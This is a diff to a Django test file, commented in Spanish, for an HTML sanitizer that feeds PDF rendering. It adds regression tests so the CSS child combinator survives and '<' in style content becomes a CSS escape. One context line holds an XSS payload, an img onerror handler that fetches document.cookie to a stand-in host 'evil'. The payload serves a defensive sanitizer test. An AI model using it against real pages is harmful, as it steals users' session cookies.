@@ -46,13 +46,23 @@ class SanitizeHtmlTests(SimpleTestCase):
                    '<img src=x onerror="fetch(\'https://evil/?d=\'+document.cookie)">')
         out = pdf.sanitize_html(payload)
         # El texto puede seguir mencionando "onerror" (es inerte, ver abajo),
-        # pero la invariante real es que ni un solo `<`/`>` crudo sobrevive
-        # después de `<style>` — sin eso no hay forma de que se vuelva a
+        # pero la invariante real es que ni un solo `<` crudo sobrevive
+        # después de `<style>` — sin él no hay forma de que se vuelva a
         # convertir en una etiqueta nueva, decida Blink lo que decida sobre
-        # dónde termina el `<style>`.
+        # dónde termina el `<style>` (un `>` suelto es texto inerte).
         after_style = out.split("<style>", 1)[1]
         self.assertNotIn("<", after_style)
-        self.assertNotIn(">", after_style)
+
+    def test_combinador_hijo_directo_en_style_sobrevive(self):
+        """Regresión: `>` salía como `&gt;` y Chromium tiraba la regla entera
+        (`.a &gt; .b` no es un selector válido): los temas no podían usar el
+        combinador de hijo directo."""
+        css = '<style>.hoja > tbody > tr > td{padding:0}</style>'
+        self.assertEqual(pdf.sanitize_html(css), css)
+
+    def test_menor_que_en_style_sale_como_escape_css(self):
+        out = pdf.sanitize_html('<style>.a::before{content:"<"}</style>')
+        self.assertIn('content:"\\3c "', out)
 
     def test_style_con_comillas_legitimas_no_se_rompe(self):
         # Mermaid genera reglas como esta; escapar comillas/& aquí rompía el
